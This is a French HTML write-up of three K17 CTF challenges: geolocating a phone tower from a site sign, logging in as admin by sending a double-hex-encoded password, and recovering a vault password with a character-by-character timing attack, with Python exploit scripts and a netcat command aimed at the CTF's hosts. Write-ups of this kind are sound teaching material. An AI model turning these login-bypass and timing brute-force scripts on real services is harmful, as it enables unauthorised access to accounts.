@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>K17 CTF Write-up</title>
+    <style>
+        body {
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            line-height: 1.7;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 30px;
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+        }
+        .challenge {
+            background-color: #161616;
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+            border: 1px solid #2a2a2a;
+        }
+        .code-block {
+            background-color: #1a1a1a;
+            color: #7cff7c;
+            padding: 20px;
+            border-radius: 6px;
+            font-family: 'Fira Code', monospace;
+            overflow-x: auto;
+            border: 1px solid #333;
+        }
+        h1 {
+            color: #fff;
+            font-size: 2.5em;
+            text-align: center;
+            margin-bottom: 40px;
+            text-shadow: 0 0 10px rgba(255,255,255,0.1);
+        }
+        h2 {
+            color: #7cff7c;
+            font-size: 1.8em;
+            margin-top: 30px;
+        }
+        h3 {
+            color: #66b3ff;
+            font-size: 1.4em;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+        h4 {
+            color: #ff9966;
+            font-size: 1.2em;
+            margin-top: 25px;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 20px 0;
+            border-radius: 6px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        .points {
+            color: #7cff7c;
+            font-size: 1.1em;
+        }
+        .category {
+            color: #66b3ff;
+            font-size: 1.1em;
+        }
+        ul, ol {
+            padding-left: 25px;
+        }
+        li {
+            margin: 8px 0;
+            line-height: 1.6;
+        }
+        code {
+            background-color: #1a1a1a;
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            color: #ff9966;
+        }
+        .solution-content {
+            background-color: #1c1c1c;
+            padding: 20px;
+            border-radius: 6px;
+            margin: 15px 0;
+        }
+        .image-container {
+            background-color: #1a1a1a;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        pre {
+            margin: 0;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <h1>Write-up K17 CTF</h1>
+    
+    <div class="challenge">
+        <h2>OSINT radioactive</h2>
+        <p><strong class="category">Catégorie:</strong> OSINT</p>
+        <p><strong class="points">Points:</strong> 317</p>
+        
+        <h3>Description</h3>
+        <p>Where is this tower located?<br>
+        Format du flag: K17{lat,lon} avec coordonnées arrondies à 3 décimales</p>
+        
+        <h3>Solution</h3>
+        <div class="solution-content">
+            <h4>Analyse de l'image</h4>
+            <!-- Image de l'antenne -->
+            <div class="image-container">
+                <img src="image.jpg" alt="Antenne télécom">
+            </div>
+            <p>En zoomant sur la pancarte, on découvre la mention :</p>
+            <!-- Image de la pancarte zoomée -->
+            <div class="image-container">
+                <img src="Capture d'écran 2025-09-19 111526.png" alt="Pancarte NSA Site Number">
+            </div>
+            <p><strong>NSA Site Number: 2154?06</strong></p>
+            <p>Un chiffre est masqué par la grille. Le numéro complet est <strong>2154006</strong>.</p>
+
+            <h4>Recherche OSINT</h4>
+            <p>Le panneau indique un site web australien : <strong>www.rfnsa.com.au</strong></p>
+            <div class="image-container">
+                <img src="Capture d'écran 2025-09-19 111612.png" alt="Pancarte NSA Site Number">
+            </div>
+            <p>En recherchant le numéro 2154006, on trouve :</p>
+            <ul>
+                <li><strong>Adresse:</strong> Gilbert Road (East of Field 1 Fred Caterson Reserve), CASTLE HILL NSW 2154</li>
+                <li><strong>Coordonnées:</strong> -33.71721, 150.9871</li>
+                <li><strong>Type:</strong> 35m Concrete Pole</li>
+                <li><strong>Opérateurs:</strong> Optus, Telstra (3G/4G/5G)</li>
+            </ul>
+
+            <h4>Extraction des coordonnées</h4>
+            <p>Arrondissement à 3 décimales :</p>
+            <ul>
+                <li>Latitude : -33.71721 → <strong>-33.717</strong></li>
+                <li>Longitude : 150.9871 → <strong>150.987</strong></li>
+            </ul>
+        </div>
+        
+        <p><strong>Flag:</strong> <code>K17{-33.717,150.987}</code></p>
+    </div>
+
+    <div class="challenge">
+        <h2>Pass me the salt</h2>
+        <p><strong class="category">Catégorie:</strong> Crypto</p>
+        <p><strong class="points">Points:</strong> 200</p>
+        
+        <h3>Description</h3>
+        <p>Se connecter en <code>admin</code> pour afficher le flag.</p>
+        
+        <h3>Solution</h3>
+        <div class="solution-content">
+            <h4>🔍 Analyse détaillée du problème</h4>
+            <p>Le serveur présente une vulnérabilité due à une incohérence de format entre l'inscription et la connexion :</p>
+            <div class="code-block">
+                <pre>
+# À l'inscription :
+password = "admin"
+stored = (password).encode().hex()  # "61646d696e"
+
+# À la connexion :
+input = "3631363436643639366e"
+check = bytes.fromhex(input)  # doit donner b"61646d696e"</pre>
+            </div>
+            <p>Cette incohérence crée une confusion entre :</p>
+            <ul>
+                <li>Le texte hexadécimal (ex: "61646d696e")</li>
+                <li>Les octets correspondants (b"admin")</li>
+                <li>Le double encodage hexadécimal nécessaire</li>
+            </ul>
+
+            <h4>Exploitation</h4>
+            <p>Pour se connecter en admin, il faut fournir l'hex de la chaîne <code>"61646d696e"</code> :</p>
+            <div class="code-block">
+                <pre>b"61646d696e".hex() = 3631363436643639366e</pre>
+            </div>
+
+            <h4>Exploit manuel</h4>
+                <pre>$ nc challenge.secso.cc 7002
+2
+Login: admin
+Password: 3631363436643639366e</pre>
+            </div>
+
+            <h4>Explication</h4>
+            <p>L'exploit fonctionne car :</p>
+            <ul>
+                <li>Inscription : hash de <code>salt || "61646d696e"</code> (texte)</li>
+                <li>Connexion : on doit donner un mot de passe hex qui décode exactement en <code>b"61646d696e"</code></li>
+            </ul>
+
+            <h4>Remède</h4>
+            <p>Toujours transformer le mot de passe de la même façon à l'inscription et à la connexion (pas de mélange texte/hex).</p>
+
+            <h4>Scripts d'exploitation</h4>
+            <p>Version minimale :</p>
+            <div class="code-block">
+                <pre>
+import socket, re
+HOST, PORT = "challenge.secso.cc", 7002
+pwd = "3631363436643639366e"
+s = socket.create_connection((HOST,PORT))
+s.recv(4096); s.sendall(b"2\n")
+s.recv(4096); s.sendall(b"admin\n")
+s.recv(4096); s.sendall((pwd+"\n").encode())
+out = s.recv(4096).decode()
+print(out)
+m = re.search(r"K17CTF\{[^}]+\}", out)
+if m: print("[FLAG]", m.group(0))</pre>
+            </div>
+
+            <p>Version complète avec gestion des erreurs :</p>
+            <div class="code-block">
+                <pre>
+#!/usr/bin/env python3
+import socket, time, sys, re
+
+HOST = "challenge.secso.cc"
+PORT = 7002
+
+# calcule le "double-hex" demandé par la logique du chall
+# admin -> "admin".encode().hex() = "61646d696e"
+# password à taper = bytes("61646d696e","ascii").hex() = "3631363436643639366e"
+def double_hex(s: str) -> str:
+    return bytes(s.encode().hex(), "ascii").hex()
+
+ADMIN_DHEX = double_hex("admin")  # "3631363436643639366e"
+
+def recv_all_until(sock, needles=(b"(1, 2, 3)>", b"flag", b"Flag", b"Congratulations", b"Invalid"), timeout=2.0):
+    sock.settimeout(timeout)
+    buf = b""
+    t0 = time.time()
+    while time.time() - t0 < timeout:
+        try:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            buf += chunk
+            if any(n in buf for n in needles):
+                break
+        except socket.timeout:
+            break
+    return buf
+
+def try_admin_once(verbose=True):
+    s = socket.create_connection((HOST, PORT), timeout=5)
+    # avale la bannière jusqu'à l'invite
+    _ = recv_all_until(s, timeout=2.0)
+
+    s.sendall(b"2\n")
+    _ = recv_all_until(s, needles=(b"Login:",), timeout=1.0)
+    s.sendall(b"admin\n")
+    _ = recv_all_until(s, needles=(b"Password:",), timeout=1.0)
+    s.sendall((ADMIN_DHEX + "\n").encode())
+
+    resp = recv_all_until(s, timeout=2.0).decode(errors="ignore")
+    s.close()
+
+    if verbose:
+        last_lines = "\n".join(resp.splitlines()[-10:])
+        print("[server tail]")
+        print(last_lines)
+
+    if re.search(r"flag|Flag|Congratulations", resp):
+        m = re.search(r"(K17\{[^}]+\}|flag\{[^}]+\}|secso\{[^}]+\})", resp)
+        if m:
+            print(f"FLAG: ")
+        else:
+            print("Succès")
+        return True
+
+    if "Invalid" in resp:
+        return False
+
+    return False
+
+def main():
+    print(f"Target: {HOST}:{PORT}")
+    print(f"Using admin double-hex password: {ADMIN_DHEX}")
+
+    max_tries = 12
+    for i in range(1, max_tries+1):
+        print(f"\n[=] Attempt {i}/{max_tries}")
+        try:
+            ok = try_admin_once(verbose=(i == 1 or i % 3 == 0))
+            if ok:
+                print("[+] Done.")
+                return
+        except Exception as e:
+            print(f"[!] Attempt {i} error: {e}")
+        time.sleep(0.3)
+
+    print("No luck after multiple attempts ")
+    print("    Relance le script ")
+
+if __name__ == "__main__":
+    main()</pre>
+            </div>
+        </div>
+        
+        <p><strong>Flag:</strong> <code>K17CTF{s4Lt_4nD_p3pper_is_ov3rr4t3d}</code></p>
+    </div>
+
+    <div class="challenge">
+        <h2>vzult</h2>
+        <p><strong class="category">Catégorie:</strong> Web</p>
+        <p><strong class="points">Points:</strong> 250</p>
+        
+        <h3>Description</h3>
+        <p>Trouvez le mot de passe du vault en exploitant une vulnérabilité de timing.</p>
+        
+        <h3>Solution</h3>
+        <div class="solution-content">
+            <h4>Analyse</h4>
+            <p>Le serveur présente une vulnérabilité de timing attack :</p>
+            <ul>
+                <li>Le temps de réponse est plus élevé quand un caractère est correct</li>
+                <li>Pour le premier caractère : ~200ms si correct, ~100ms si incorrect</li>
+                <li>Pour les suivants : ~1030ms si correct, ~1000ms si incorrect</li>
+                <li>La différence de taille de réponse aide aussi à identifier les bons caractères</li>
+            </ul>
+
+            <h4>🎯 Exploitation détaillée du timing attack</h4>
+            <p>L'attaque fonctionne car le serveur vérifie le mot de passe caractère par caractère :</p>
+            <ol>
+                <li><strong>Comportement normal :</strong>
+                    <ul>
+                        <li>Mauvais caractère : réponse rapide (~100ms)</li>
+                        <li>Le serveur arrête la vérification dès qu'un caractère est incorrect</li>
+                    </ul>
+                </li>
+                <li><strong>Comportement avec caractère correct :</strong>
+                    <ul>
+                        <li>Premier caractère correct : ~200ms</li>
+                        <li>Caractères suivants : ~30ms supplémentaires par caractère</li>
+                        <li>Le serveur continue la vérification, d'où le délai plus long</li>
+                    </ul>
+                </li>
+                <li><strong>Indices supplémentaires :</strong>
+                    <ul>
+                        <li>Taille de réponse différente pour les bons caractères</li>
+                        <li>Accumulation progressive des délais</li>
+                        <li>Possibilité de construire le mot de passe caractère par caractère</li>
+                    </ul>
+                </li>
+            </ol>
+
+            <div class="code-block">
+                <pre>
+# Exemple de progression des délais :
+H    -> 200ms  (bon premier caractère)
+Ha   -> 230ms  (bon deuxième caractère)
+Hac  -> 260ms  (bon troisième caractère)
+Hack -> 290ms  (mot complet correct)</pre>
+            </div>
+
+            <h4>Script d'exploit</h4>
+            <div class="code-block">
+                <pre>
+import requests, string
+
+url = "https://vault.secso.cc/"
+charset = string.ascii_letters + string.digits + "{}_"
+
+known = ""
+while True:
+    best_char, best_time = None, -1
+    for c in charset:
+        test = known + c
+        r = requests.get(url, params={"password": test})
+        text = r.text
+        try:
+            t = float(text.split("Response time:")[1].split("ms")[0].strip())
+        except:
+            t = 0.0
+        if t > best_time:
+            best_char, best_time = c, t
+    if best_time <= 0:
+        break
+    known += best_char
+    print("[+] Found so far:", known)</pre>
+            </div>
+            <div class="image-container">
+                <img src="Capture d'écran 2025-09-19 164844.png" alt="Burp Suite config">
+            </div>
+            <h4>Approche manuelle avec Burp</h4>
+            <!-- Images Burp Suite -->
+            <div class="image-container">
+                <img src="Capture d'écran 2025-09-19 155047.png" alt="Burp Suite config">
+            </div>
+            <div class="image-container">
+                <img src="Capture d'écran 2025-09-19 155402.png" alt="Mauvaise tentative">
+            </div>
+            <div class="image-container">
+                <img src="Capture d'écran 2025-09-19 155920.png" alt="Bonne tentative">
+            </div>
+            <div class="image-container">
+                <img src="Capture d'écran 2025-09-19 160015.png" alt="Résultat final">
+            </div>
+            <p>On peut aussi utiliser Burp Intruder pour visualiser les différences de timing :</p>
+            <ul>
+                <li>Configuration de l'attaque par caractère</li>
+                <li>Analyse des temps de réponse</li>
+                <li>Identification des caractères corrects par les pics de timing</li>
+            </ul>
+
+            <h4>Métho</h4>
+            <ol>
+                <li>Test caractère par caractère</li>
+                <li>Pour 'H' : temps de réponse ~200ms (au lieu de 100ms)</li>
+                <li>Chaque caractère correct ajoute ~30ms au temps de base</li>
+                <li>La taille de réponse change aussi pour les caractères corrects</li>
+            </ol>
+        </div>
+    </div>
+</body>
+</html>
